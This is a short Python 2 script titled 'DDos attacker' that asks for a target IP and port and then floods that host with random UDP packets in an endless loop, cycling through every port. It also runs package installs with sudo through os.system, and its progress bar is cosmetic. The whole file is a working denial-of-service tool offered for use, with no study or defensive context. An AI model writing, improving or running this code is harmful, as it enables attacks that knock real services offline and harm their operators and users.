import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system (" pkg install figlet -y ")
os.system (" pkg install ruby -y ")
os.system (" gem install lolcat")
os.system (" sudo apt-get install figlet -y ")
os.system (" sudo apt-get install ruby -y ")
os.system (" sudo gem install lolcat")
os.system (" clear ")
os.system (" figlet DDos attacker | lolcat ")

print
print "Creator : Amir codect (( JASEM ))"
print "Github  : github.com/Jasem-codect"
print "My id   : t.me/JSM_codect"
print
ip = raw_input("IP Target : ")
port = input("Port        : ")

os.system (" clear ")
os.system (" figlet STARTING | lolcat ")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

